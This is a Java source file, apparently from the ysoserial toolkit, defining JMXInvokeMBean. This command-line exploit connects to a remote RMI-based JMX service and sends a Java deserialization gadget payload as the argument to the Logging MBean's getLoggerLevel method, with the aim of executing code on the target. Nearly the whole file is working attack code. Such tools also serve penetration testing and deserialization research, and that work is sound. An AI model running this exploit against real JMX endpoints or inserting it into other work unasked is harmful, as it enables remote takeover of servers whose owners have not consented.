package ysoserial.exploit;

import javax.management.MBeanServerConnection;
import javax.management.ObjectName;
import javax.management.remote.JMXConnector;
import javax.management.remote.JMXConnectorFactory;
import javax.management.remote.JMXServiceURL;

import ysoserial.payloads.ObjectPayload.Utils;

/*
 * Utility program for exploiting RMI based JMX services running with required gadgets available in their ClassLoader.
 * Attempts to exploit the service by invoking a method on a exposed MBean, passing the payload as argument.
 * 
 */
public class JMXInvokeMBean {

	public static void main(String[] args) throws Exception {
	
		if ( args.length < 4 ) {
			System.err.println(JMXInvokeMBean.class.getName() + " <host> <port> <payload_type> <payload_arg>");
			System.exit(-1);
		}
    	
		JMXServiceURL url = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://" + args[0] + ":" + args[1] + "/jmxrmi");
        
		JMXConnector jmxConnector = JMXConnectorFactory.connect(url);
		MBeanServerConnection mbeanServerConnection = jmxConnector.getMBeanServerConnection();

		// create the payload
		Object payloadObject = Utils.makePayloadObject(args[2], args[3]);   
		ObjectName mbeanName = new ObjectName("java.util.logging:type=Logging");

		mbeanServerConnection.invoke(mbeanName, "getLoggerLevel", new Object[]{payloadObject}, new String[]{String.class.getCanonicalName()});

		//close the connection
		jmxConnector.close();
    }
}